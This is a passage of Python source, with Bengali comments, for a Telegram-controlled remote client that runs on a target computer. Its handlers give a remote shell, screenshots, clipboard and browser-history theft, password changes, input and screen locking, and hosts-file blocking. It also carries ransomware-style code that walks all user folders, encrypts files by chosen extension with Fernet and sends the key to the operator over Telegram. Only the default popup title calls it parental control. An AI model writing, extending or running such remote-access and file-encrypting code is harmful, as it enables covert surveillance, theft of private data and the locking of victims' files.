        return
    target = " ".join(context.args).lower()
    killed_count = 0
    for proc in psutil.process_iter(['name', 'pid']):
        try:
            if proc.info['name'].lower() == target or str(proc.info['pid']) == target:
                proc.terminate()
                killed_count += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied): continue
    if killed_count > 0:
        await context.bot.send_message(chat_id=chat_id, text=f"⛔️ {killed_count} টি প্রসেস (<code>{target}</code>) সফলভাবে বন্ধ করা হয়েছে।", parse_mode='HTML')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ <code>{target}</code> নামের কোনো সক্রিয় প্রসেস খুঁজে পাওয়া যায়নি।", parse_mode='HTML')

async def block_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return
    if not context.args:
        await context.bot.send_message(chat_id=chat_id, text="ব্যবহারের নিয়ম: <code>/block [website.com]</code>", parse_mode='HTML')
        return
    website = context.args[0]
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts" if os.name == 'nt' else "/etc/hosts"
    redirect = "127.0.0.1"

    if not is_running_as_admin() and os.name == 'nt':
        await context.bot.send_message(chat_id=chat_id, text="❌ hosts ফাইল এডিট করার জন্য ক্লায়েন্টকে অ্যাডমিনিস্ট্রেটরের হিসেবে চালাতে হবে।", parse_mode='HTML')
        return
    try:
        with open(hosts_path, 'a') as f:
            f.write(f"\n{redirect} {website} # REMOTELY BLOCKED")
        await context.bot.send_message(chat_id=chat_id, text=f"🛑 <b>{website}</b> সফলভাবে ব্লক করা হয়েছে।", parse_mode='HTML')
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"hosts ফাইল এডিটিং এ ত্রুটি: {e}", parse_mode='HTML')

async def unblock_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """hosts ফাইল থেকে নির্দিষ্ট ওয়েবসাইট আনব্লক করে।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    if not context.args:
        await context.bot.send_message(chat_id=chat_id, text="ব্যবহারের নিয়ম: <code>/unblock [website.com]</code>", parse_mode='HTML')
        return

    website = context.args[0]
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts" if os.name == 'nt' else "/etc/hosts"

    if not is_running_as_admin() and os.name == 'nt':
        await context.bot.send_message(chat_id=chat_id, text="❌ hosts ফাইল এডিট করার জন্য ক্লায়েন্টকে অ্যাডমিনিস্ট্রেটরের হিসেবে চালাতে হবে।", parse_mode='HTML')
        return

    try:
        with open(hosts_path, 'r') as f:
            lines = f.readlines()

        new_lines = []
        unblocked_count = 0
        block_entry = f" # REMOTELY BLOCKED"

        for line in lines:
            if not (website in line and block_entry in line):
                new_lines.append(line)
            else:
                unblocked_count += 1

        if unblocked_count > 0:
            with open(hosts_path, 'w') as f:
                f.writelines(new_lines)
            await context.bot.send_message(chat_id=chat_id, text=f"✅ <b>{website}</b> সফলভাবে আনব্লক করা হয়েছে।", parse_mode='HTML')
        else:
            await context.bot.send_message(chat_id=chat_id, text=f"⚠️ <b>{website}</b> hosts ফাইলে ব্লক করা ছিল না।", parse_mode='HTML')

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"hosts ফাইল এডিটিং এ ত্রুটি: {e}", parse_mode='HTML')

def show_popup_windows(title: str, message: str):
    """Windows API ব্যবহার করে একটি মেসেজ বক্স ডিসপ্লে করে।"""
    if os.name == 'nt':
        try:
            ctypes.windll.user32.MessageBoxW(None, message, title, MB_ICONWARNING | MB_OK)
            return True
        except Exception as e:
            print(f"পপ-আপ তৈরি ব্যর্থ: {e}")
            return False
    return False

async def send_popup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """রিমোট কমান্ডের মাধ্যমে টার্গেট কম্পিউটারে একটি পপ-আপ মেসেজ দেখায়।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    if not context.args:
        await context.bot.send_message(
            chat_id=chat_id,
            text="ব্যবহারের নিয়ম: 💬 <code>/popup [পপ-আপের টাইটেল]; [আপনার মেসেজ]</code>",
            parse_mode='HTML'
        )
        return

    full_message = " ".join(context.args)
    if ';' in full_message:
        title, message = full_message.split(';', 1)
        title = title.strip()
        message = message.strip()
    else:
        title = "প্যারেন্টাল কন্ট্রোল সতর্কতা"
        message = full_message.strip()

    await context.bot.send_message(chat_id=chat_id, text=f"⏳ পপ-আপ মেসেজ পাঠানো হচ্ছে: <b>{title}</b>", parse_mode='HTML')

    def run_popup(t, m):
        if show_popup_windows(t, m):
            print("পপ-আপ সফলভাবে ডিসপ্লে হয়েছে।")
        else:
            print("পপ-আপ ডিসপ্লে করতে ব্যর্থ।")

    Thread(target=run_popup, args=(title, message)).start()
# --- ৬. এনক্রিপশন/ডিক্রিপশন হ্যান্ডলার ---

async def process_folder_recursively(update: Update, context: ContextTypes.DEFAULT_TYPE, mode: str):
    """ফোল্ডার এনক্রিপ্ট বা ডিক্রিপ্ট করার মূল লজিক।"""
    chat_id = update.effective_chat.id
    if not context.args:
        await context.bot.send_message(chat_id=chat_id, text=f"ব্যবহারের নিয়ম: <code>/{mode}_folder [ফোল্ডারের সম্পূর্ণ পাথ]</code>", parse_mode='HTML')
        return

    target_path = " ".join(context.args)
    if not os.path.isdir(target_path):
        await context.bot.send_message(chat_id=chat_id, text=f"❌ ডিরেক্টরি খুঁজে পাওয়া যায়নি: <code>{target_path}</code>", parse_mode='HTML')
        return

    key = load_key()
    if not key and mode == 'decrypt':
        await context.bot.send_message(chat_id=chat_id, text="❌ ডিক্রিপশন কী (secret.key) খুঁজে পাওয়া যায়নি। প্রথমে এনক্রিপ্ট করুন।", parse_mode='HTML')
        return
    elif not key and mode == 'encrypt':
        key = setup_key() # কী না থাকলে নতুন করে তৈরি হবে

    fernet = Fernet(key)

    await context.bot.send_message(chat_id=chat_id, text=f"⏳ <b>{mode.capitalize()}ion শুরু হচ্ছে...</b>\nটার্গেট: <code>{target_path}</code>", parse_mode='HTML')

    processed_files = 0
    failed_files = 0

    for root, _, files in os.walk(target_path):
        for filename in files:
            filepath = os.path.join(root, filename)
            result = process_file_fernet(filepath, fernet, mode)
            if "✅" in result:
                processed_files += 1
            else:
                failed_files += 1
                print(result)

    summary_message = (
        f"✅ <b>প্রসেসিং সম্পন্ন!</b>\n"
        f"• মোট সফল ফাইল: {processed_files}\n"
        f"• মোট ব্যর্থ ফাইল: {failed_files}"
    )
    await context.bot.send_message(chat_id=chat_id, text=summary_message, parse_mode='HTML')


async def encrypt_folder_remote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """নির্দিষ্ট ফোল্ডারের সমস্ত ফাইল এনক্রিপ্ট করে।"""
    await process_folder_recursively(update, context, 'encrypt')


async def decrypt_folder_remote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """নির্দিষ্ট ফোল্ডারের সমস্ত ফাইল ডিক্রিপ্ট করে।"""
    await process_folder_recursively(update, context, 'decrypt')

# --- নতুন ফিচার: সিস্টেম-ওয়াইড ফাইল প্রসেসিং ---
async def process_system_files(update: Update, context: ContextTypes.DEFAULT_TYPE, mode: str):
    """সিস্টেমের ইউজার ফোল্ডার জুড়ে নির্দিষ্ট এক্সটেনশনের ফাইল এনক্রিপ্ট/ডিক্রিপ্ট করে।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    if not context.args:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"ব্যবহারের নিয়ম: <code>/{mode}_all [.ext1] [.ext2]...</code>\n"
                 f"উদাহরণ: <code>/{mode}_all .jpg .png .mp4</code>",
            parse_mode='HTML'
        )
        return

    target_extensions = [ext.lower() for ext in context.args]

    # --- নিরাপত্তা সতর্কতা ---
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"⚠️ <b>সতর্কতা!</b> আপনি একটি সিস্টেম-ওয়াইড {mode} প্রক্রিয়া শুরু করতে চলেছেন। "
             f"এটি সমস্ত ইউজার প্রোফাইলের মধ্যে থাকা <code>{', '.join(target_extensions)}</code> ফাইলগুলোকে প্রভাবিত করবে। "
             f"এই প্রক্রিয়াটি সম্পন্ন হতে অনেক সময় লাগতে পারে।",
        parse_mode='HTML'
    )

    key = load_key()
    if not key and mode == 'decrypt':
        await context.bot.send_message(chat_id=chat_id, text="❌ ডিক্রিপশন কী (secret.key) খুঁজে পাওয়া যায়নি।")
        return
    elif not key and mode == 'encrypt':
        key = setup_key()

    fernet = Fernet(key)

    status_message = await context.bot.send_message(
        chat_id=chat_id,
        text=f"⏳ <b>{mode.capitalize()}ion শুরু হচ্ছে...</b> অনুগ্রহ করে অপেক্ষা করুন। বট কিছুক্ষণের জন্য সাড়া নাও দিতে পারে।",
        parse_mode='HTML'
    )

    processed_files = 0
    failed_files = 0

    # শুধুমাত্র ইউজারদের ফোল্ডার টার্গেট করা (নিরাপদ পদ্ধতি)
    if os.name == 'nt':
        users_path = os.path.join(os.getenv("SystemDrive", "C:"), "Users")
    else:
        users_path = "/home" # লিনাক্সের জন্য

    excluded_dirs = ['appdata', 'local settings', 'application data', 'public', 'default']

    for root, dirs, files in os.walk(users_path, topdown=True):
        # এক্সক্লুড করা ফোল্ডারগুলোকে বাদ দেওয়া
        dirs[:] = [d for d in dirs if d.lower() not in excluded_dirs]

        for filename in files:
            if filename.lower().endswith(tuple(target_extensions)):
                filepath = os.path.join(root, filename)
                result = process_file_fernet(filepath, fernet, mode)

                if "✅" in result:
                    processed_files += 1
                else:
                    failed_files += 1

                # প্রতি ১০০টি ফাইলে স্ট্যাটাস আপডেট
                if (processed_files + failed_files) % 100 == 0:
                    try:
                        await context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=status_message.message_id,
                            text=f"⏳ <b>প্রসেসিং চলছে...</b>\n"
                                 f"• সফল: {processed_files}\n"
                                 f"• ব্যর্থ: {failed_files}",
                            parse_mode='HTML'
                        )
                    except Exception: # মেসেজ এডিট করতে সমস্যা হলে উপেক্ষা করা
                        pass

    summary_message = (
        f"✅ <b>প্রসেসিং সম্পন্ন!</b>\n"
        f"• মোট সফল ফাইল: {processed_files}\n"
        f"• মোট ব্যর্থ ফাইল: {failed_files}"
    )
    await context.bot.send_message(chat_id=chat_id, text=summary_message, parse_mode='HTML')


async def encrypt_system_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ইউজার ফোল্ডার জুড়ে ফাইল এনক্রিপ্ট করার কমান্ড।"""
    await process_system_files(update, context, 'encrypt')


async def decrypt_system_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ইউজার ফোল্ডার জুড়ে ফাইল ডিক্রিপ্ট করার কমান্ড।"""
    await process_system_files(update, context, 'decrypt')
# --- নতুন ফিচার শেষ ---


async def get_encryption_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """এনক্রিপশন কী ফাইলটি টেলিগ্রামে পাঠায়।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    key_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), KEY_FILE_NAME)

    if os.path.exists(key_file_path):
        try:
            await context.bot.send_document(
                chat_id=chat_id,
                document=open(key_file_path, 'rb'),
                filename=KEY_FILE_NAME,
                caption="🔐 আপনার এনক্রিপশন কী ফাইল। এটি সুরক্ষিত রাখুন।"
            )
        except Exception as e:
            await context.bot.send_message(chat_id=chat_id, text=f"❌ কী ফাইল পাঠাতে সমস্যা হয়েছে: {e}")
    else:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ কোনো এনক্রিপশন কী (secret.key) খুঁজে পাওয়া যায়নি।")

# --- মূল ফাংশন ---
async def post_init(application: Application) -> None:
    """বট শুরু হওয়ার পর আপনাকে নোটিফিকেশন পাঠায়। (HTML ফরম্যাট)"""
    try:
        await application.bot.send_message(chat_id=AUTHORIZED_CHAT_ID, text="✅ <b>রিমোট ক্লায়েন্ট সক্রিয় হয়েছে!</b>", parse_mode='HTML')
    except Exception as e:
        print(f"নোটিফিকেশন পাঠানোর সময় ত্রুটি: {e}")

def main():
    """বট অ্যাপ্লিকেশন তৈরি করে এবং শুরু করে।"""
    try:
        if not pygame.mixer.get_init():
            pygame.mixer.init()
        print("✅ Pygame Mixer সফলভাবে ইনিশিয়ালাইজ হয়েছে।")
    except Exception as e:
        print(f"❌ Pygame Mixer ইনিশিয়ালাইজেশনে ত্রুটি: {e}")

    application = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()

    # --- সমস্ত হ্যান্ডলার ---
    application.add_handler(CommandHandler("status", send_status))
    application.add_handler(CommandHandler("screenshot", take_screenshot))
    application.add_handler(CommandHandler("shutdown", shutdown_pc))
    application.add_handler(CommandHandler("restart", restart_pc))
    application.add_handler(CommandHandler("apps", active_apps))
    application.add_handler(CommandHandler("clipboard", check_clipboard))
    application.add_handler(CommandHandler("kill", kill_app))
    # application.add_handler(CommandHandler("webcam", capture_webcam)) # REMOVED
    # application.add_handler(CommandHandler("record", record_audio)) # REMOVED
    application.add_handler(CommandHandler("history", get_browser_history))
    application.add_handler(CommandHandler("cmd", remote_shell))
    application.add_handler(CommandHandler("block", block_site))
    application.add_handler(CommandHandler("unblock", unblock_site))
    application.add_handler(CommandHandler("lock_input", lock_keyboard_mouse))
    application.add_handler(CommandHandler("unlock_input", unlock_keyboard_mouse))
    application.add_handler(CommandHandler("lock_screen", lock_screen))
    application.add_handler(CommandHandler("set_wallpaper", set_wallpaper))
    application.add_handler(CommandHandler("play_audio", play_audio))
    application.add_handler(CommandHandler("stop_audio", stop_audio))
    application.add_handler(CommandHandler("popup", send_popup))
    application.add_handler(CommandHandler("current_user", current_user))
    application.add_handler(CommandHandler("list_users", list_users))
    application.add_handler(CommandHandler("change_pass", change_pass))
    application.add_handler(CommandHandler("ls", list_files))
    application.add_handler(CommandHandler("open_file", open_file_remote))
    application.add_handler(CommandHandler("cat", view_file_content))

    # --- ফোল্ডার-ভিত্তিক এনক্রিপশন কমান্ড ---
    application.add_handler(CommandHandler("encrypt_folder", encrypt_folder_remote))
    application.add_handler(CommandHandler("decrypt_folder", decrypt_folder_remote))

    # --- সিস্টেম-ওয়াইড এনক্রিপশন কমান্ড ---
    application.add_handler(CommandHandler("encrypt_all", encrypt_system_files))
    application.add_handler(CommandHandler("decrypt_all", decrypt_system_files))

    application.add_handler(CommandHandler("get_key", get_encryption_key))

    print("বট সফলভাবে শুরু হয়েছে এবং কমান্ডের জন্য অপেক্ষা করছে...")
    application.run_polling(poll_interval=1.0)

if __name__ == '__main__':
    main()
